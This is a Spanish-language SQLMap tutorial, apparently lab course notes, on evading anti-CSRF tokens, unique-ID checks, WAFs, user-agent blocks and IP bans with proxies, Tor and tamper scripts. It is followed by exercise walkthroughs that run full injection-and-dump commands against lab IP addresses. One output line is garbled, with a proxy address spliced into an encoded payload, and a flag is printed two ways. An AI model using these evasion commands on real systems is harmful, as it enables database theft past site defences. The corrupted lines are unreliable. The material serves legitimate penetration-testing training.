
# SQLMap - Bypass de protección web

En un escenario ideal, no se implementará ninguna protección en el lado objetivo, por lo que no se evitará la explotación automática. De lo contrario, podemos esperar problemas al ejecutar una herramienta automatizada de cualquier tipo contra dicho objetivo. Sin embargo, se incorporan muchos mecanismos en SQLMap que pueden ayudarnos a eludir con éxito dichas protecciones.

***

## <mark style="color:purple;">Omisión de tokens anti-CSRF</mark>

Una de las primeras líneas de defensa contra el uso de herramientas de automatización es la incorporación de `tokens anti-CSRF` (es decir, Cross-Site Request Forgery) en todas las solicitudes HTTP, especialmente aquellas generadas como resultado del llenado de formularios web.

En términos más básicos, cada solicitud HTTP en un escenario de este tipo debería tener un valor de token (válido) disponible solo si el usuario realmente visitó y utilizó la página. Si bien la idea original era la prevención de escenarios con enlaces maliciosos, donde el simple hecho de abrir estos enlaces tendría consecuencias no deseadas para los usuarios que iniciaron sesión sin saberlo (por ejemplo, abrir páginas de administrador y agregar un nuevo usuario con credenciales predefinidas), esta característica de seguridad también fortaleció inadvertidamente las aplicaciones contra la automatización (no deseada).

Sin embargo, SQLMap tiene opciones que pueden ayudar a eludir la protección anti-CSRF. En concreto, la opción más importante es `--csrf-token`. Al especificar el nombre del parámetro de token (que ya debería estar disponible en los datos de la solicitud proporcionada), SQLMap intentará analizar automáticamente el contenido de la respuesta de destino y buscar nuevos valores de token para poder usarlos en la próxima solicitud.

Además, incluso en un caso en el que el usuario no especifica explícitamente el nombre del token a través de `--csrf-token`, si uno de los parámetros proporcionados contiene alguno de los infijos comunes (es decir `csrf`, `xsrf`, `token`), se le preguntará al usuario si desea actualizarlo en futuras solicitudes:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:18:01 /2020-09-18/

POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```

***

## <mark style="color:purple;">Bypass de Unique ID</mark>

En algunos casos, la aplicación web puede requerir únicamente que se proporcionen valores únicos dentro de parámetros predefinidos. Este mecanismo es similar a la técnica anti-CSRF descrita anteriormente, excepto que no es necesario analizar el contenido de la página web. Por lo tanto, con solo asegurarse de que cada solicitud tenga un valor único para un parámetro predefinido, la aplicación web puede evitar fácilmente los intentos de CSRF y, al mismo tiempo, evitar algunas de las herramientas de automatización. Para esto, se debe utilizar la opción `--randomize` que apunta al nombre del parámetro que contiene un valor que se debe aleatorizar antes de enviarse:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```

***

## <mark style="color:purple;">Bypass de parámetro calculado</mark>

Otro mecanismo similar es cuando una aplicación web espera que se calcule un valor de parámetro adecuado en función de otros valores de parámetro. La mayoría de las veces, un valor de parámetro debe contener el resumen del mensaje (por ejemplo, `h=MD5(id)`) de otro. Para evitar esto, se debe utilizar la opción `--eval` , donde se evalúa un código Python válido justo antes de que se envíe la solicitud al destino:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
```

***

## <mark style="color:purple;">Ocultar dirección IP</mark>

En caso de que queramos ocultar nuestra dirección IP, o si una determinada aplicación web tiene un mecanismo de protección que pone en lista negra nuestra dirección IP actual, podemos intentar utilizar un proxy o la red de anonimato Tor. Un proxy se puede configurar con la opción `--proxy`(por ejemplo `--proxy="socks4://177.39.187.70:33283"`), donde debemos agregar un proxy que funcione.

Además de eso, si tenemos una lista de servidores proxy, podemos proporcionárselos a SQLMap con la opción `--proxy-file`. De esta manera, SQLMap recorrerá secuencialmente la lista y, en caso de que surja algún problema (por ejemplo, la inclusión en la lista negra de direcciones IP), simplemente saltará de la actual a la siguiente de la lista. La otra opción es el uso de la red Tor para proporcionar una anonimización fácil de usar, donde nuestra IP puede aparecer en cualquier lugar de una gran lista de nodos de salida de Tor. Cuando se instala correctamente en la máquina local, debería haber un servicio de proxy `SOCKS4` en el puerto local 9050 o 9150. Al usar el interruptor `--tor`, SQLMap intentará automáticamente encontrar el puerto local y usarlo adecuadamente.

Si quisiéramos asegurarnos de que Tor se está utilizando correctamente, para evitar un comportamiento no deseado, podríamos usar el modificador `--check-tor`. En tales casos, SQLMap se conectará a `https://check.torproject.org/`y comprobará la respuesta para el resultado deseado (es decir, que aparezca dentro `Congratulations`).

***

## <mark style="color:purple;">Bypass WAF</mark>

Siempre que ejecutamos SQLMap, como parte de las pruebas iniciales, SQLMap envía un payload predefinido de aspecto malicioso utilizando un nombre de parámetro inexistente (por ejemplo, `?pfov=...`) para probar la existencia de un WAF (firewall de aplicaciones web). Habrá un cambio sustancial en la respuesta en comparación con el original en caso de que exista alguna protección entre el usuario y el objetivo. Por ejemplo, si se implementa una de las soluciones WAF más populares (ModSecurity), debería haber una respuesta `406 - Not Acceptable` después de dicha solicitud.

En caso de detección positiva, para identificar el mecanismo de protección real, SQLMap utiliza una biblioteca de terceros [identYwaf](https://github.com/stamparm/identYwaf) , que contiene las firmas de 80 soluciones WAF diferentes. Si quisiéramos omitir esta prueba heurística por completo (es decir, para producir menos ruido), podemos utilizar el switch `--skip-waf`.

***

## <mark style="color:purple;">Bypass de listas negras de User-agent</mark>

En caso de problemas inmediatos (por ejemplo, código de error HTTP 5XX desde el inicio) al ejecutar SQLMap, una de las primeras cosas en las que debemos pensar es en la posible inclusión en la lista negra del User-agent predeterminado utilizado por SQLMap (por ejemplo `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`).

Esto es fácil de evitar con el modificador `--random-agent`, que cambia el agente de usuario predeterminado con un valor elegido aleatoriamente de un gran conjunto de valores utilizados por los navegadores.

{% hint style="info" %}
**Nota**: Si se detecta algún tipo de protección durante la ejecución, podemos esperar problemas con el objetivo, incluso con otros mecanismos de seguridad. La razón principal es el continuo desarrollo y las nuevas mejoras en dichas protecciones, que dejan cada vez menos margen de maniobra a los atacantes.
{% endhint %}

***

## <mark style="color:purple;">Tamper Scripts</mark>

Por último, uno de los mecanismos más populares implementados en SQLMap para eludir las soluciones WAF/IPS son los llamados Tamper Scripts o de "manipulación". Los scripts de manipulación son un tipo especial de scripts (Python) escritos para modificar las solicitudes justo antes de enviarlas al destino, en la mayoría de los casos para eludir alguna protección.

Por ejemplo, uno de los scripts de manipulación [más populares](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) es reemplazar todas las apariciones del operador mayor que ( `>`) con `NOT BETWEEN 0 AND #`, y el operador igual ( `=`) con `BETWEEN # AND #`. De esta manera, muchos mecanismos de protección primitivos (enfocados principalmente en prevenir ataques XSS) se pueden eludir fácilmente, al menos para propósitos de SQLi.

Los scripts de manipulación se pueden encadenar, uno tras otro, dentro de la opción `--tamper` (por ejemplo, `--tamper=between,randomcase`), donde se ejecutan según su prioridad predefinida. Se predefine una prioridad para evitar cualquier comportamiento no deseado, ya que algunos scripts modifican las cargas útiles modificando su sintaxis SQL (por ejemplo, [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py) ). Por el contrario, algunos scripts de manipulación no se preocupan por el contenido interno (por ejemplo, [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py) ).

Los scripts de manipulación pueden modificar cualquier parte de la solicitud, aunque la mayoría cambia el contenido del payload. Los scripts de manipulación más destacados son los siguientes:

<table data-header-hidden><thead><tr><th width="297"></th><th></th></tr></thead><tbody><tr><td><strong>Script de manipulación</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>0eunion</code></td><td>Reemplaza instancias de UNIÓN con e0UNIÓN</td></tr><tr><td><code>base64encode</code></td><td>Codifica en Base64 todos los caracteres en un payload determinado</td></tr><tr><td><code>between</code></td><td>Reemplaza el operador mayor que ( <code>></code>) con <code>NOT BETWEEN 0 AND #</code>y el operador igual ( <code>=</code>) con <code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td>Reemplaza instancias (MySQL) como <code>LIMIT M, N</code> con su contraparte <code>LIMIT N OFFSET M</code></td></tr><tr><td><code>equaltolike</code></td><td>Reemplaza todas las apariciones del operador igual ( <code>=</code>) con su contraparte <code>LIKE</code></td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>Agrega un comentario versionado (MySQL) antes de cada palabra clave</td></tr><tr><td><code>modsecurityversioned</code></td><td>Incluye una consulta completa con comentarios versionados (MySQL)</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>Admite consultas completas con comentarios con versión cero (MySQL)</td></tr><tr><td><code>percentage</code></td><td>Agrega un signo de porcentaje ( <code>%</code>) delante de cada carácter (por ejemplo, SELECT -> %S%E%L%E%C%T)</td></tr><tr><td><code>plus2concat</code></td><td>Reemplaza el operador más ( <code>+</code>) con su contraparte CONCAT() de la función (MsSQL)</td></tr><tr><td><code>randomcase</code></td><td>Reemplaza cada carácter de palabra clave con un valor de mayúsculas y minúsculas aleatorio (por ejemplo, SELECT -> SEleCt)</td></tr><tr><td><code>space2comment</code></td><td>Reemplaza el carácter de espacio ( ) con comentarios `/</td></tr><tr><td><code>space2dash</code></td><td>Reemplaza el carácter de espacio ( ) con un comentario de guión ( <code>--</code>) seguido de una cadena aleatoria y una nueva línea ( )</td></tr><tr><td><code>space2hash</code></td><td>Reemplaza (MySQL) las instancias del carácter de espacio ( ) con un carácter de almohadilla ( <code>#</code>) seguido de una cadena aleatoria y una nueva línea ( )</td></tr><tr><td><code>space2mssqlblank</code></td><td>Reemplaza (MsSQL) instancias del carácter de espacio ( ) con un carácter en blanco aleatorio de un conjunto válido de caracteres alternativos</td></tr><tr><td><code>space2plus</code></td><td>Reemplaza el carácter de espacio ( ) por el signo más ( <code>+</code>)</td></tr><tr><td><code>space2randomblank</code></td><td>Reemplaza el carácter de espacio ( ) con un carácter en blanco aleatorio de un conjunto válido de caracteres alternativos</td></tr><tr><td><code>symboliclogical</code></td><td>Reemplaza los operadores lógicos AND y OR con sus contrapartes simbólicas ( <code>&#x26;&#x26;</code>y <code>||</code>)</td></tr><tr><td><code>versionedkeywords</code></td><td>Encierra cada palabra clave que no sea de función con un comentario versionado (MySQL)</td></tr><tr><td><code>versionedmorekeywords</code></td><td>Encierra cada palabra clave con un comentario versionado (MySQL)</td></tr></tbody></table>

Para obtener una lista completa de los scripts de manipulación implementados, junto con la descripción que se menciona anteriormente, se puede utilizar el switch `--list-tampers`. También podemos desarrollar scripts de manipulación personalizados para cualquier tipo de ataque personalizado, como un SQLi de segundo orden.

***

## <mark style="color:purple;">Bypass varios</mark>

Además de otros mecanismos de omisión de protección, hay dos más que se deben mencionar. El primero es la codificación de transferencia `Chunked`, que se activa mediante el switch `--chunked`, que divide el cuerpo de la solicitud POST en los llamados "fragmentos". Las palabras clave SQL incluidas en la lista negra se dividen entre fragmentos de manera que la solicitud que las contiene pueda pasar desapercibida.

El otro mecanismo de derivación es el `HTTP parameter pollution`( `HPP`), donde los payloads se dividen de manera similar al caso de `--chunked` entre diferentes valores con el mismo parámetro nombrado (por ejemplo, `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), que son concatenados por la plataforma de destino si la admite (por ejemplo, `ASP`).

***

## Ejercicios

```
Objetivo: 94.237.63.227:56193
```

### Pregunta 1

¿Cuál es el contenido de la tabla flag8? (Caso n.° 8)

<figure><img src="/files/Cith4tBKYKWmt0ZaGB9F" alt=""><figcaption></figcaption></figure>

Tenemos que detectar y explotar un SQLi en el parámetro id que se envía por POST, teniendo en cuenta la protección anti-CSRF:

```shell-session
afsh4ck@kali$ sqlmap -u "http://94.237.63.227:56193/case8.php" --data="id=1&t0ken=DFlZYVKEvvBQtlVSvsHdsWABHCPPpQvtoBMuLSFmuw" --csrf-token="t0ken" --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:42:07 /2024-08-14/

[00:42:08] [INFO] resuming back-end DBMS 'mysql' 
[00:42:08] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ppslp7n15n6...560bnp2rbe'). Do you want to use those [Y/n] Y
[00:42:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[00:42:08] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[00:42:08] [INFO] fetching current database
[00:42:08] [INFO] fetching tables for database: 'testdb'
[00:42:09] [INFO] fetching columns for table 'flag8' in database 'testdb'
[00:42:09] [INFO] fetching entries for table 'flag8' in database 'testdb'
Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_bE3n_c5rf_70k3n1z3d} |
+----+-----------------------------------+
```

### Pregunta 2

¿Cuál es el contenido de la tabla flag9? (Caso n.° 9)

<figure><img src="/files/XDfABio1hiNMDe2fvUaB" alt=""><figcaption></figcaption></figure>

Tenemos que detectar y explotar un SQLi en el parámetro id que se envía por GET, teniendo en cuenta el UID único:

{% hint style="info" %}
No olvides especificar el nombre del parámetro que necesitas aleatorizar.
{% endhint %}

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.251.65:30618/case9.php?id=1&uid=3386644662" --randomize=uid --batch --dump --random-agent 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:16:05 /2024-08-14/

[11:16:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.5) Gecko/20060806 Firefox/1.5.0.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:16:05] [INFO] testing connection to the target URL
[11:16:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:16:05] [INFO] testing if the target URL content is stable
[11:16:06] [INFO] target URL content is stable
[11:16:06] [INFO] testing if GET parameter 'id' is dynamic
[11:16:06] [INFO] GET parameter 'id' appears to be dynamic
[11:16:06] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[11:16:06] [INFO] testing for SQL injection on GET parameter 'id'
[11:16:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[11:16:37] [INFO] fetching entries for table 'flag9' in database 'testdb'
Database: testdb
Table: flag9
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_mUch_r4nd0mn355_f0r_my_74573} |
+----+---------------------------------------+
```

### Pregunta 3

¿Cuál es el contenido de la tabla flag10? (Caso n.° 10)

Tenemos que detectar y explotar un SQLi en un parámetro `id` que se envía por POST:

<figure><img src="/files/Tv0T4MzXrl0yVU57XOwr" alt=""><figcaption></figcaption></figure>

Capturamos la petición con Burpsuite y guardamos la petición en un archivo `case10.req`

```shell-session
afsh4ck@kali$ sqlmap -r /home/kali/Escritorio/case10.req --level=5 --risk=3 --dump --batch 
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:31:26 /2024-08-14/

[11:31:26] [INFO] parsing HTTP request from '/home/kali/Escritorio/case10.req'
[11:31:26] [INFO] testing connection to the target URL
[11:31:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:31:26] [INFO] testing if the target URL content is stable
[11:31:26] [INFO] target URL content is stable
[11:31:26] [INFO] testing if POST parameter 'id' is dynamic
[11:31:26] [INFO] POST parameter 'id' appears to be dynamic
[11:31:51] [INFO] target URL appears to have 9 columns in query
[11:31:51] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[11:31:52] [INFO] fetching current database
[11:31:52] [INFO] fetching tables for database: 'testdb'
[11:31:52] [INFO] fetching columns for table 'flag10' in database 'testdb'
[11:31:52] [INFO] fetching entries for table 'flag10' in database 'testdb'
Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+----+----------------------------+
```

### Pregunta 4

¿Cuál es el contenido de la tabla flag11? (Caso n.° 11)

<figure><img src="/files/6oyELXvyhyy06VeSPhek" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Según los datos proporcionados en la página, seleccione el script de manipulación adecuado para eludir las protecciones de la página.
{% endhint %}

#### Paso 1: Seleccionar un tamper script adecuado

Si encuentras que los caracteres < y > están bloqueados, prueba con un tamper script que transforme la inyección SQL para evitar esos caracteres. Un tamper scripts que podría funcionar es:

* `between`: Usa BETWEEN en lugar de operadores como < o >.

#### Paso 2: Explotar SQLi con un Tamper Script

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sqlmap -u "http://83.136.251.65:30618/case11.php?id=1" --tamper=between --batch --dump --level=5 --risk=3
</strong>        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:49:21 /2024-08-14/

[11:49:21] [INFO] loading tamper module 'between'
[11:49:21] [INFO] testing connection to the target URL
[11:49:21] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:49:21] [INFO] testing if the target URL content is stable
[11:49:21] [INFO] target URL content is stable
[11:49:21] [INFO] testing if GET parameter 'id' is dynamic
[11:49:22] [INFO] GET parameter 'id' appears to be dynamic
[11:49:22] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[11:51:16] [INFO] fetching current database
[11:51:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:51:16] [INFO] retrieved: testdb
[11:51:19] [INFO] fetching tables for database: 'testdb'
[11:51:19] [INFO] fetching number of tables for database 'testdb'
[11:51:19] [INFO] retrieved: 2
[11:51:19] [INFO] retrieved: users
[11:51:22] [INFO] retrieved: flag11
[11:51:26] [INFO] fetching columns for table 'users' in database 'testdb'
[11:51:26] [INFO] retrieved: 9
[11:51:26] [INFO] retrieved: id
[11:51:29] [INFO] retrieved: name
[11:51:31] [INFO] retrieved: birthday
[11:51:35] [INFO] retrieved: occupation
[11:51:40] [INFO] retrieved: address
[11:51:46] [INFO] retrieved: phone
[11:51:48] [INFO] retrieved: cc
[11:51:49] [INFO] retrieved: email
[11:51:52] [INFO] retrieved: password
</code></pre>

Nos encontramos de que la enumeración de esta base de datos es muy lenta al hacer el dump completo, enconces vamos a hacer una query específica para extraer la flag 11:

```shell-session
afsh4ck@kali$ sqlmap -u "http://83.136.251.65:30618/case11.php?id=1" --tamper=between --dump -T flag11 -D testdb
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:58:23 /2024-08-14/

[11:58:23] [INFO] loading tamper module 'between'
[11:58:23] [INFO] resuming back-end DBMS 'mysql' 
[11:58:23] [INFO] testing connection to the target URL
[11:58:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[11:58:23] [INFO] fetching columns for table 'flag11' in database 'testdb'
[11:58:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:58:23] [INFO] retrieved: 2
[11:58:23] [INFO] retrieved: id
[11:58:25] [INFO] retrieved: content
[11:58:28] [INFO] fetching entries for table 'flag11' in database 'testdb'
[11:58:28] [INFO] fetching number of entries for table 'flag11' in database 'testdb'
[11:58:28] [INFO] retrieved: 1
[11:58:29] [INFO] retrieved: HTB{5p3c14l_ch4r5_n0_m0r3}
[11:58:45] [INFO] retrieved: 1
Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_mOr3} |
+----+----------------------------+
```
